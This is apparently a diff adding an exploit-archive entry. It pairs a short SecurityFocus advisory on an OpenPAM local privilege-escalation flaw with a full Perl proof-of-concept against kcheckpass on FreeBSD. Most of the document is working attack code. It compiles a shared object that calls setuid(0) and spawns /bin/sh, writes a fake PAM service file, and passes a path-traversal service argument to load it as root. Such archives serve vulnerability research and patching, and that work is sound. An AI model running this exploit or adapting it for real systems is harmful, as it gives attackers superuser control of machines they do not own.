@@ -1,0 +1,52 @@
+source: http://www.securityfocus.com/bid/50607/info
+
+OpenPAM is prone to a local privilege-escalation vulnerability.
+
+Local attackers may exploit this issue to execute arbitrary code with superuser privileges. Successfully exploiting this issue will result in the complete compromise of affected computers. 
+
+#!/usr/bin/perl
+
+# kcheckpass invoking pam_start() with user provided
+# service argument, what a bad idea. OpenPAM accepts that.
+# Maybe this pam_start() vulnerability is exploitable via
+# other vectors as well.
+# Vuln tested on a FreeBSD 8.1. It does not affect
+# Linux PAM, as it is checking for / character
+
+# (C) 2011 by some dude, meant as a PoC! Only use on your own
+# machine and on your own risk!!!
+#
+# This commit is likely to fix the bug:
+# http://trac.des.no/openpam/changeset/478/trunk/lib/openpam_configure.c
+#
+
+my $kcheckpass = "/usr/local/kde4/lib/kde4/libexec/kcheckpass";
+
+# build suid shell
+open(O,">/tmp/slam.c") or die $!;
+print O<<EOC;
+
+#include <stdio.h>
+#include <unistd.h>
+
+void __attribute__((constructor)) init()
+{
+	char *a[] = {"/bin/sh", NULL};
+	setuid(0);
+	execve(*a, a, NULL);
+}
+EOC
+close(O);
+
+# build fake pam module
+system("gcc -fPIC -Wall -c /tmp/slam.c -o /tmp/slam.o;gcc -shared -o /tmp/slam.so /tmp/slam.o");
+
+# build fake PAM service file
+open(O,">/tmp/pamslam") or die $!;
+print O<<EOP;
+auth	sufficient	/tmp/slam.so
+EOP
+close(O);
+
+print "We need more Elchsalami! Happy birthday dude!\n";
+exec("$kcheckpass -c ../../../tmp/pamslam -m classic");
